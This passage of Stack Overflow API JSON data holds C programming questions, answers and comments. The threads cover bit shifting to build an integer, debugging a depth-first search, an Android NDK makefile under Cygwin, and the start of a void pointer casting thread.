54072082, "body": "the OR in binary terms means overwrite the bits with 1&#39;s. So if your binary number is 100 and you or&#39;ed it with 101, then you&#39;d still get 101 (which means 4 or 5 = 5). Now if you used plus, then you&#39;re forcing addition. since bit shifting only modifies the proper bits, using a plus causes no harm."}], "tags": [], "owner": {"reputation": 2016, "user_id": 5141989, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/3dPUW.jpg?s=128&g=1", "display_name": "Mike -- No longer here", "link": "https://stackoverflow.com/users/5141989/mike-no-longer-here"}, "is_accepted": false, "score": 1, "last_activity_date": 1444836415, "creation_date": 1444836415, "answer_id": 33129472, "question_id": 33128934, "link": "https://stackoverflow.com/questions/33128934/combining-three-bits-to-get-a-single-integer-value/33129472#33129472", "title": "Combining three bits to get a single integer value", "body": "<p>In order to get a true answer you need to define what variable belongs to what bit position in the binary number you're trying to calculate and make sure you set the value of each variable to either zero or one or you'll be shifting the wrong bits around in the result.</p>\n\n<p>In the code example below, the order of bits read from left to right is var3, var2, var1. var3 is known as the most significant bit, and var1 is known as the least significant bit.</p>\n\n<p>If you want the value of 1, you set var1 to 1, then var2 and var3 to 0.\nIf you want the value of 4, you set var1 and var2 to 0 then set var3 to 1.\nIf you want the value of 5, you set var1 and var3 to 1 then set var2 to 0.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(void){\n    int var1=1;\n    int var2=0;\n    int var3=1;\n    int res=(var3 &lt;&lt; 2) + (var2 &lt;&lt; 1) + var1;\n    printf(\"%d\\n\",res);\n    return 0;\n}\n</code></pre>\n\n<p>If you want a somewhat easier-to-understand version, you can use this code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(void){\n    int LeastSignificantBit=1;\n    int MiddleBit=0;\n    int MostSignificantBit=1;\n    int Number=0;\n    Number=(MostSignificantBit &lt;&lt; 2) + (MiddleBit &lt;&lt; 1) + (LeastSignificantBit &lt;&lt; 0);\n    printf(\"Number is %d\\n\",Number);\n    return 0;\n}\n</code></pre>\n\n<p>I understand using <code>&lt;&lt; 0</code> is overkill, but I'm illustrating the fact that the least significant bit doesn't need to be shifted over.</p>\n"}, {"tags": [], "owner": {"reputation": 46, "user_id": 4333492, "user_type": "registered", "profile_image": "https://graph.facebook.com/100002246240709/picture?type=large", "display_name": "Filipe Herculano Rocha", "link": "https://stackoverflow.com/users/4333492/filipe-herculano-rocha"}, "is_accepted": false, "score": 0, "last_activity_date": 1444842014, "creation_date": 1444842014, "answer_id": 33131382, "question_id": 33128934, "link": "https://stackoverflow.com/questions/33128934/combining-three-bits-to-get-a-single-integer-value/33131382#33131382", "title": "Combining three bits to get a single integer value", "body": "<p>When you bit shift some number you will just go from right to left on the memory. So, as we know, if we shift the number to the left it'll be multiplied by 2, since the base of the computer is binary. If we shift to the right, it'll be divided by 2.</p>\n\n<p>like this:</p>\n\n<p>decimal 5  --> binary 00101\ndecimal 10 --> binary 01010</p>\n\n<p>Note that we've just shifted once to the left and we have the result of 5 multiplied by 2, therefore 10.</p>\n\n<p>In your code I suggest you receive the variables by an scanf, the proceed to shift those and then sum them, like so:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(){\n    int var1, var2, var3;\n    scanf(\"%d %d %d\", &amp;var1, &amp;var2, &amp;var3);\n    printf(\"%d\\n\", (var1 &lt;&lt; 2) + (var2 &lt;&lt; 1) + var3);\n    return 0;\n}\n</code></pre>\n\n<p>The code above we put the variable__&lt;&lt;__number_of_shifts. So in the first one we shift the var1 twice, the second one we shift once and at the last one we shift none. Then we sum all together and have your answer!</p>\n"}, {"tags": [], "owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "is_accepted": false, "score": 0, "last_activity_date": 1444901610, "last_edit_date": 1444901610, "creation_date": 1444900849, "answer_id": 33144575, "question_id": 33128934, "link": "https://stackoverflow.com/questions/33128934/combining-three-bits-to-get-a-single-integer-value/33144575#33144575", "title": "Combining three bits to get a single integer value", "body": "<p>If the input variables are guaranteed to have value 1 or 0 then:</p>\n\n<pre><code>address = (var1 &lt;&lt; 2) | (var2 &lt;&lt; 1) | var3 ;\n</code></pre>\n\n<p>will do exactly what you want; however given that <code>var1</code> etc. are integers an invalid and likely out-of-range address will be generated if the preconditions are not checked or limited.</p>\n\n<p>A more flexible and maintainable implementation that allows simple address range extension would be to use an array rather than three separate variables. The fact that you numbered then in the first place rather suggests an array might be appropriate in any case):</p>\n\n<pre><code>#define ADDR_BITLEN 3\nunsigned var[ADDR_BITLEN] ;\n\n...\n\nunsigned address = 0 ;\nfor( int bit = ADDR_BITLEN - 1; bit &gt;= 0; bit++ )\n{\n    address |= ((var[bit] == 0) ? 0 : 1) &lt;&lt; bit ;\n}\n</code></pre>\n\n<p>Now any number of bits up-to the bit length of an <code>unsigned</code> may be used for <code>address</code> simply by changing <code>ADDR_BITLEN</code>, further more the loop body ensures that an invalid address is not generated if <code>address_bits[bit]</code> is > 1 by selecting 0 or 1 explicitly, which would be somewhat cumbersome and hard to read and maintain if the array and loop were not used. </p>\n"}], "owner": {"reputation": 105, "user_id": 3475003, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/2440f4c7f7f0710374eb645c69643bcd?s=128&d=identicon&r=PG&f=1", "display_name": "user3475003", "link": "https://stackoverflow.com/users/3475003/user3475003"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 196, "favorite_count": 0, "answer_count": 6, "score": -1, "last_activity_date": 1445289942, "creation_date": 1444834984, "last_edit_date": 1445289942, "question_id": 33128934, "link": "https://stackoverflow.com/questions/33128934/combining-three-bits-to-get-a-single-integer-value", "title": "Combining three bits to get a single integer value", "body": "<p>So I have three variables each hold a 1 or a 0. These three form an address 0 - 7 when combined. for example\n    var1 = 1;\n    var2 = 0;\n    var3 = 1;</p>\n\n<p>would be 5. </p>\n\n<p>How would I go about combining these three variable to get an integer value? I have heard bit shifting operations would be the best way but I'm not sure how to do it. thanks.</p>\n"}, {"tags": ["c", "graph-traversal"], "comments": [{"owner": {"reputation": 2300, "user_id": 2437292, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/PjYDO.jpg?s=128&g=1", "display_name": "sashas", "link": "https://stackoverflow.com/users/2437292/sashas"}, "edited": false, "score": 1, "creation_date": 1444833675, "post_id": 33128405, "comment_id": 54068837, "body": "What is that you think is wrong ?"}, {"owner": {"reputation": 1, "user_id": 4341473, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/523d30e73613139735f85da459027133?s=128&d=identicon&r=PG&f=1", "display_name": "user24603", "link": "https://stackoverflow.com/users/4341473/user24603"}, "reply_to_user": {"reputation": 2300, "user_id": 2437292, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/PjYDO.jpg?s=128&g=1", "display_name": "sashas", "link": "https://stackoverflow.com/users/2437292/sashas"}, "edited": false, "score": 0, "creation_date": 1444833708, "post_id": 33128405, "comment_id": 54068855, "body": "Instead of getting a path like say &quot;1 2 4 5&quot; if the item is &quot;1&quot;, I am getting &quot;2 3 2 4&quot; or something like that. Firstly, the nodes are repeating even though I am keeping track of which nodes are visited. Secondly, the source (item) is not figuring in the list of nodes in the path."}, {"owner": {"reputation": 7369, "user_id": 2436655, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2f13e1ea8bbf6506462623c85acb8e32?s=128&d=identicon&r=PG&f=1", "display_name": "pzaenger", "link": "https://stackoverflow.com/users/2436655/pzaenger"}, "edited": false, "score": 0, "creation_date": 1444833764, "post_id": 33128405, "comment_id": 54068897, "body": "<code>while(top!=0) {...}</code> You dont&#39;t change the value of <code>top</code>, do you? However, you will need to provide some more information. You need to create a <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable example</a>."}, {"owner": {"reputation": 1, "user_id": 4341473, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/523d30e73613139735f85da459027133?s=128&d=identicon&r=PG&f=1", "display_name": "user24603", "link": "https://stackoverflow.com/users/4341473/user24603"}, "edited": false, "score": 0, "creation_date": 1444833828, "post_id": 33128405, "comment_id": 54068940, "body": "I am using top=0 for empty stack"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 4341473, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/523d30e73613139735f85da459027133?s=128&d=identicon&r=PG&f=1", "display_name": "user24603", "link": "https://stackoverflow.com/users/4341473/user24603"}, "edited": false, "score": 0, "creation_date": 1444834512, "post_id": 33128537, "comment_id": 54069443, "body": "thanks for the &lt;= correction. Missed it. If I don&#39;t change item then the same node will get pushed into the stack again and again. Isn&#39;t it?"}, {"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "reply_to_user": {"reputation": 1, "user_id": 4341473, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/523d30e73613139735f85da459027133?s=128&d=identicon&r=PG&f=1", "display_name": "user24603", "link": "https://stackoverflow.com/users/4341473/user24603"}, "edited": false, "score": 0, "creation_date": 1444834683, "post_id": 33128537, "comment_id": 54069567, "body": "@user24603 Sorry, <code>i</code> should be used instead of <code>item</code>. Edited."}, {"owner": {"reputation": 1, "user_id": 4341473, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/523d30e73613139735f85da459027133?s=128&d=identicon&r=PG&f=1", "display_name": "user24603", "link": "https://stackoverflow.com/users/4341473/user24603"}, "edited": false, "score": 0, "creation_date": 1444834876, "post_id": 33128537, "comment_id": 54069699, "body": "I tried the new edit you suggested. It still won&#39;t work the way I want it. Still getting the same output as with the original code."}], "tags": [], "owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "is_accepted": false, "score": 0, "last_activity_date": 1444834665, "last_edit_date": 1444834665, "creation_date": 1444833912, "answer_id": 33128537, "question_id": 33128405, "link": "https://stackoverflow.com/questions/33128405/dfs-to-find-all-possible-paths-where-am-i-going-wrong/33128537#33128537", "title": "DFS to find all possible paths - Where am I going wrong?", "body": "<p>I think you shouldn't overwrite (break) <code>item</code> when <code>visited[i]==0</code>.</p>\n\n<p>Moreover, the range differs in initialization and DFS.</p>\n\n<p>There are some more corrections.</p>\n\n<pre><code>void dfs()\n{\n    int i;\n    for(i=1;i&lt;=nodecount;i++)\n    {\n        visited[i]=0;\n    }\n    visited[item]=1; /* add this to mark the start point as visited */\n    push(item);\n    while(top!=0)\n    {\n        pop();\n        /* delete visited[item]=1; here */\n        for(i=1;i&lt;=nodecount;i++) /* changed &lt; to &lt;= */\n        {\n            if(topo[item][i]==1)\n            {\n                if(visited[i]==0)\n                {\n                    visited[i]=1; /* item is unchanged unless push change it */\n                    push(i);\n                }\n            }\n        }\n    }\n}\n</code></pre>\n\n<p>Not knowing, I believe that <code>push</code> and <code>pop</code> do proper work with <code>item</code> and <code>top</code>, and that there are enough elements in <code>visited</code>.</p>\n\n<p>In case of <code>push</code> assumes that <code>item</code> will be passed as the parameter, try this instead:</p>\n\n<pre><code>void dfs()\n{\n    int i;\n    for(i=1;i&lt;=nodecount;i++)\n    {\n        visited[i]=0;\n    }\n    visited[item]=1; /* add this to mark the start point as visited */\n    push(item);\n    while(top!=0)\n    {\n        pop();\n        /* delete visited[item]=1; here */\n        for(i=1;i&lt;=nodecount;i++) /* changed &lt; to &lt;= */\n        {\n            if(topo[item][i]==1)\n            {\n                if(visited[i]==0)\n                {\n                    int item_bak = item;\n                    item = i;\n                    visited[item]=1;\n                    push(item);\n                    item = item_bak;\n                }\n            }\n        }\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "is_accepted": false, "score": 0, "last_activity_date": 1444837096, "creation_date": 1444837096, "answer_id": 33129734, "question_id": 33128405, "link": "https://stackoverflow.com/questions/33128405/dfs-to-find-all-possible-paths-where-am-i-going-wrong/33129734#33129734", "title": "DFS to find all possible paths - Where am I going wrong?", "body": "<p>What about a recursive function for that?</p>\n\n<pre><code>void dfs(int item) {\n  int i;\n  push(item);\n  visited[item] = 1;\n  pstack();\n\n  for(i=1; i&lt;nodecount; i++) {\n    if ((nodes[item][i] == 1) &amp;&amp; (visited[i] == 0)) {\n      dfs(i);\n      visited[i] = 0;\n    }\n  }\n  pop();\n}\n</code></pre>\n\n<p>Here pstack() is a function that prints the content of the stack, and this function must be called with visited[] inited to 0.\nUsing the same graphe than you I get:</p>\n\n<pre><code>. 2 \n. 2 1 \n. 2 1 4 \n. 2 1 4 5 \n. 2 1 4 5 3 \n. 2 3 \n. 2 3 5 \n. 2 3 5 4 \n. 2 3 5 4 1 \n. 2 4 \n. 2 4 1 \n. 2 4 5 \n. 2 4 5 3 \n</code></pre>\n\n<p>I made 'item' a parameter of the function. Note: starting counts at 1 is not really C-aware :)</p>\n"}], "owner": {"reputation": 1, "user_id": 4341473, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/523d30e73613139735f85da459027133?s=128&d=identicon&r=PG&f=1", "display_name": "user24603", "link": "https://stackoverflow.com/users/4341473/user24603"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 76, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1444837096, "creation_date": 1444833576, "last_edit_date": 1444834145, "question_id": 33128405, "link": "https://stackoverflow.com/questions/33128405/dfs-to-find-all-possible-paths-where-am-i-going-wrong", "title": "DFS to find all possible paths - Where am I going wrong?", "body": "<p>I need to implement DFS to find all possible paths from a vertex, say    \"item\"<br>\nSo far I have the following and I cannot understand where I am going wrong.</p>\n\n<pre><code>void dfs()\n{\n    int i;\n    for(i=1;i&lt;=nodecount;i++)\n    {\n        visited[i]=0;\n    }\n    push(item);\n    while(top!=0)\n    {\n        pop();\n        visited[item]=1;\n        for(i=1;i&lt;nodecount;i++)\n        {\n            if(topo[item][i]==1)\n            {\n                if(visited[i]==0)\n                {\n                    item=i;\n                    visited[i]=1;\n                    push(item);\n                }\n            }\n        }\n    }\n}\n</code></pre>\n\n<p>Example:\nIf I have an undirected graph where</p>\n\n<ul>\n<li>node 1 is connected to 2,4</li>\n<li>node 2 is connected to 1,4,3</li>\n<li>node 3 is connected to 2,5,6</li>\n<li>node 4 is connected to 1,2,5</li>\n<li>node 5 is connected to 4,3,6</li>\n<li>node 6 is connected to 3,5</li>\n</ul>\n\n<p>With this code, if item = 2 then I should get</p>\n\n<ul>\n<li>2-1-4-5-6-3</li>\n<li>2-1</li>\n<li>2-1-4</li>\n<li>2-2-1-5-6-3</li>\n</ul>\n\n<p>and so on.</p>\n\n<p>But I am getting </p>\n\n<ul>\n<li>2</li>\n<li>1</li>\n<li>1-4</li>\n<li>1-4-5</li>\n<li>1-4</li>\n<li>1-4-3</li>\n<li>1</li>\n</ul>\n"}, {"tags": ["android", "c", "makefile", "cygwin"], "comments": [{"owner": {"reputation": 2742, "user_id": 2771245, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/vhsVn.jpg?s=128&g=1", "display_name": "mtijanic", "link": "https://stackoverflow.com/users/2771245/mtijanic"}, "edited": false, "score": 0, "creation_date": 1444834453, "post_id": 33128275, "comment_id": 54069403, "body": "Are the tool binaries (gcc/g++/ar) present on your system?"}, {"owner": {"reputation": 41, "user_id": 5287570, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77d758da33917dd05740054dffeb37f2?s=128&d=identicon&r=PG&f=1", "display_name": "evgen-baton", "link": "https://stackoverflow.com/users/5287570/evgen-baton"}, "reply_to_user": {"reputation": 2742, "user_id": 2771245, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/vhsVn.jpg?s=128&g=1", "display_name": "mtijanic", "link": "https://stackoverflow.com/users/2771245/mtijanic"}, "edited": false, "score": 0, "creation_date": 1444834565, "post_id": 33128275, "comment_id": 54069479, "body": "yes. I extracted android NDK so they are in \u0441/other/android-toolchain/bin"}, {"owner": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 0, "creation_date": 1444834698, "post_id": 33128275, "comment_id": 54069581, "body": "For a simple library as yours, it&#39;s much easier to build an <code>Android.mk</code> file."}, {"owner": {"reputation": 41, "user_id": 5287570, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77d758da33917dd05740054dffeb37f2?s=128&d=identicon&r=PG&f=1", "display_name": "evgen-baton", "link": "https://stackoverflow.com/users/5287570/evgen-baton"}, "edited": false, "score": 0, "creation_date": 1444834805, "post_id": 33128275, "comment_id": 54069653, "body": "Maybe I&#39;m mistaken but Android.mk file is needed when building Java app using Eclipse. But my approach is to use Xamarin"}, {"owner": {"reputation": 2742, "user_id": 2771245, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/vhsVn.jpg?s=128&g=1", "display_name": "mtijanic", "link": "https://stackoverflow.com/users/2771245/mtijanic"}, "edited": false, "score": 0, "creation_date": 1444835227, "post_id": 33128275, "comment_id": 54069935, "body": "You don&#39;t want the <code>\\ </code> at the end of the lines. The manual put them there when listing multiple .c/.o objects. <code>\\ </code> at the end of the line tells make to ignore the newline, and process everything as a single line."}, {"owner": {"reputation": 41, "user_id": 5287570, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77d758da33917dd05740054dffeb37f2?s=128&d=identicon&r=PG&f=1", "display_name": "evgen-baton", "link": "https://stackoverflow.com/users/5287570/evgen-baton"}, "reply_to_user": {"reputation": 2742, "user_id": 2771245, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/vhsVn.jpg?s=128&g=1", "display_name": "mtijanic", "link": "https://stackoverflow.com/users/2771245/mtijanic"}, "edited": false, "score": 0, "creation_date": 1444835509, "post_id": 33128275, "comment_id": 54070130, "body": "@mtijanic if I remove all backslahes (\\&#41; at the end of all lines I get an error <code>make-static-library.mak:9: *** missing separator.  Stop.</code>"}, {"owner": {"reputation": 2742, "user_id": 2771245, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/vhsVn.jpg?s=128&g=1", "display_name": "mtijanic", "link": "https://stackoverflow.com/users/2771245/mtijanic"}, "edited": false, "score": 0, "creation_date": 1444835744, "post_id": 33128275, "comment_id": 54070307, "body": "One other thing - in make,  <code>[tab]</code> vs <code>[space]</code> matters, as tabs are very specific. So, you need to insert a tab before these two lines: <code>[tab]$(CC) ($CFLAGS) .....</code> and <code>[tab]$(AR) -crs ....</code>. Also add an empty line after both of those, for good measure (not strictly needed, but can help avoid some problems)"}, {"owner": {"reputation": 41, "user_id": 5287570, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77d758da33917dd05740054dffeb37f2?s=128&d=identicon&r=PG&f=1", "display_name": "evgen-baton", "link": "https://stackoverflow.com/users/5287570/evgen-baton"}, "reply_to_user": {"reputation": 2742, "user_id": 2771245, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/vhsVn.jpg?s=128&g=1", "display_name": "mtijanic", "link": "https://stackoverflow.com/users/2771245/mtijanic"}, "edited": false, "score": 0, "creation_date": 1444836511, "post_id": 33128275, "comment_id": 54070821, "body": "@mtijanic I added [tabs] as you said. But now I get another error <code>make: &#47;cygdrive&#47;\u0441&#47;other&#47;android-toolchain&#47;bin&#47;arm-linux-androideab&zwnj;&#8203;i-gcc: Command not found</code>. But gcc tool is in that directory. here is a screenshot <a href=\"http://snag.gy/mugcV.jpg\" rel=\"nofollow noreferrer\">snag.gy/mugcV.jpg</a>"}, {"owner": {"reputation": 2742, "user_id": 2771245, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/vhsVn.jpg?s=128&g=1", "display_name": "mtijanic", "link": "https://stackoverflow.com/users/2771245/mtijanic"}, "edited": false, "score": 0, "creation_date": 1444836817, "post_id": 33128275, "comment_id": 54071039, "body": "I&#39;ve had problems with cygwin and make before that could be related. Unfortunately, you can&#39;t write <code>c:\\other...</code> into make directly, as <code>:</code> is interpreted as a special character. But, you can try this.. Remove the first line of the makefile, and before calling make do <code>set ANDROID_NDK_BIN=c:\\other\\android-toolchain\\bin</code>, then call <code>make -f  blahblah.mk</code>"}, {"owner": {"reputation": 41, "user_id": 5287570, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77d758da33917dd05740054dffeb37f2?s=128&d=identicon&r=PG&f=1", "display_name": "evgen-baton", "link": "https://stackoverflow.com/users/5287570/evgen-baton"}, "reply_to_user": {"reputation": 2742, "user_id": 2771245, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/vhsVn.jpg?s=128&g=1", "display_name": "mtijanic", "link": "https://stackoverflow.com/users/2771245/mtijanic"}, "edited": false, "score": 0, "creation_date": 1444838466, "post_id": 33128275, "comment_id": 54072184, "body": "@mtijanic I removed ANDROID_NDK_BIN from makefile and did this <code>export ANDROID_NDK_BIN=&#47;cygdrive&#47;c&#47;other&#47;android-toolchain&#47;bin</code> in console. And gcc started it&#39;s job. But now I have linking problem NTjsua_good.c:3:29: fatal error: pjsua-lib/pjsua.h: No such file or directory  #include &lt;pjsua-lib/pjsua.h&gt; ). Though I add link-flag in makefile"}, {"owner": {"reputation": 2742, "user_id": 2771245, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/vhsVn.jpg?s=128&g=1", "display_name": "mtijanic", "link": "https://stackoverflow.com/users/2771245/mtijanic"}, "edited": false, "score": 0, "creation_date": 1444901056, "post_id": 33128275, "comment_id": 54099126, "body": "You need to do the same thing for your <code>c:\\other\\StaticLibraryTest\\src</code>, - it is trying to include it from a nonexistent place. So, just export ANDROID_SRC path, and add that to CFLAGS, like <code>CFLAGS := -I$(ANDROID_SRC)</code>"}, {"owner": {"reputation": 41, "user_id": 5287570, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77d758da33917dd05740054dffeb37f2?s=128&d=identicon&r=PG&f=1", "display_name": "evgen-baton", "link": "https://stackoverflow.com/users/5287570/evgen-baton"}, "reply_to_user": {"reputation": 2742, "user_id": 2771245, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/vhsVn.jpg?s=128&g=1", "display_name": "mtijanic", "link": "https://stackoverflow.com/users/2771245/mtijanic"}, "edited": false, "score": 0, "creation_date": 1444986513, "post_id": 33128275, "comment_id": 54141243, "body": "@mtijanic I did as you said. But still getting the same error ( like there is no such file in a directory ). But I wrote all my path variables in unix-style <code>&#47;cygdrive&#47;c&#47;other&#47;StaticLibraryTest&#47;src&#47;</code> but still gcc can&#39;t find header files"}, {"owner": {"reputation": 41, "user_id": 5287570, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77d758da33917dd05740054dffeb37f2?s=128&d=identicon&r=PG&f=1", "display_name": "evgen-baton", "link": "https://stackoverflow.com/users/5287570/evgen-baton"}, "edited": false, "score": 0, "creation_date": 1445020270, "post_id": 33128275, "comment_id": 54161663, "body": "Finally I installed Ubuntu and compiled code there with no errors. Thank you all)"}], "owner": {"reputation": 41, "user_id": 5287570, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77d758da33917dd05740054dffeb37f2?s=128&d=identicon&r=PG&f=1", "display_name": "evgen-baton", "link": "https://stackoverflow.com/users/5287570/evgen-baton"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 259, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1444833248, "creation_date": 1444833248, "question_id": 33128275, "link": "https://stackoverflow.com/questions/33128275/create-android-static-library-using-makefile", "title": "create android static library using makefile", "body": "<p>I'm trying to build android static library to use PJsip. I have a simple file NTjsua_good.c with 3 functions that handles some pjsip functionality. I'm using <a href=\"https://tariqzubairy.wordpress.com/2012/03/09/arm-binaries-static-library-for-android/\" rel=\"nofollow\">this manual</a> to create libs. But now I'm stuck on make-file. This is what it looks like:  </p>\n\n<pre><code>ANDROID_NDK_BIN:=/cygdrive/\u0441/other/android-toolchain/bin\nCC := $(ANDROID_NDK_BIN)/arm-linux-androideabi-gcc\nCPP := $(ANDROID_NDK_BIN)/arm-linux-androideabi-g++\nAR := $(ANDROID_NDK_BIN)/arm-linux-androideabi-ar\nCFLAGS:= -I/cygdrive/c/other/StaticLibraryTest/src \n\n#STATIC_LIB_SRC:= NTjsua_good.c\n.c.o:\n$(CC) $(CFLAGS) -c $&lt; \\\nSTATIC_LIB_SRC = NTjsua_good.c\\\nSTATIC_LIB_OBJ= NTjsua_good.o\\\nOUT = ccStaticLib.a\\\n$(OUT): $(STATIC_LIB_OBJ) \\\n$(AR) -crs $(OUT) $(STATIC_LIB_OBJ)\n</code></pre>\n\n<p>But after executing it like this: <code>make -f make-static-library.mak</code> I get ar error: <code>no rule to make target \u00ab/cygdrive/\u0441/other/android-toolchain/bin/arm-linux-androideabi-ar\u00bb, needed by \u00ab/cygdrive/\u0441/other/android-toolchain/bin/arm-linux-androideabi-gcc\u00bb.  Stop</code><br>\nI can't figure out what is wrong with my makefile</p>\n"}, {"tags": ["c", "pointers", "void"], "answers": [{"comments": [{"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1444833317, "post_id": 33128064, "comment_id": 54068538, "body": "With the former casting value at address pointed by <code>p</code>, does that  have any change ?"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1444833408, "post_id": 33128064, "comment_id": 54068616, "body": "@ameyCU nopes. Only if there is s side effect, that will make effect, which is not the case here."}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1444833528, "post_id": 33128064, "comment_id": 54068724, "body": "And casting <code>p</code> again to <code>int *</code> will be safe ?"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1444833665, "post_id": 33128064, "comment_id": 54068827, "body": "@ameyCU yes, it will, but you won&#39;t be needing that."}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1444833755, "post_id": 33128064, "comment_id": 54068890, "body": "Why would I not need that  ? Because I am casting to <code>void</code> in first place ?"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1444833839, "post_id": 33128064, "comment_id": 54068950, "body": "@ameyCU but did you store it anywhere? :)"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1444833901, "post_id": 33128064, "comment_id": 54069004, "body": "then why should have it any 